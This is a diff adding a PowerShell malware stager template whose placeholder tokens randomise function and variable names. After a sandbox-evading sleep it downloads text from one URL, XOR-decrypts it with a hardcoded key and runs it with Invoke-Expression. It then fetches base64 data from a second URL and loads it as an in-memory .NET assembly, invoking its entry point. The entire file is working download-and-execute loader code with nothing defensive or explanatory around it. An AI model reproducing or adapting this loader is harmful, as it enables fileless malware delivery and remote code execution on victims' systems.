@@ -1,0 +1,48 @@
+
+Start-Sleep -Seconds 9
+$enc = [System.Text.Encoding]::UTF8
+
+function %%%Randowm1%%% {
+    param($string, $method)
+    $%%%Randowm2%%% = $enc.GetBytes("secretkey")
+
+    if ($method -eq "%%%Randowm4%%%"){
+        $string = $enc.GetString([System.Convert]::FromBase64String($string))
+    }
+
+    $byteString = $enc.GetBytes($string)
+    $%%%Randowm3%%% = $(for ($i = 0; $i -lt $byteString.length; ) {
+        for ($j = 0; $j -lt $%%%Randowm2%%%.length; $j++) {
+            $byteString[$i] -bxor $%%%Randowm2%%%[$j]
+            $i++
+            if ($i -ge $byteString.Length) {
+                $j = $%%%Randowm2%%%.length
+            }
+        }
+    })
+
+    if ($method -eq "encrypt") {
+        $%%%Randowm3%%% = [System.Convert]::ToBase64String($%%%Randowm3%%%)
+    } else {
+        $%%%Randowm3%%% = $enc.GetString($%%%Randowm3%%%)
+    }
+    
+    return $%%%Randowm3%%%
+}
+
+$downloadLink = %%%FirstURL%%%
+
+
+$eText = (New-Object System.Net.WebClient).DownloadString($downloadLink)
+
+ $output = %%%Randowm1%%% $eText "%%%Randowm4%%%"
+ 
+Invoke-Expression $output
+$url = %%%Sec URL%%%
+$response = Invoke-WebRequest -Uri $url
+$innerText = $response.ParsedHtml.body.innerText
+$contentToSave =  $innerText
+$data=  [System.Convert]::FromBase64String($contentToSave)
+$assembly=[System.Reflection.Assembly]::Load($data)
+$entryPoint = $assembly.EntryPoint
+$entryPoint.Invoke($null, @())
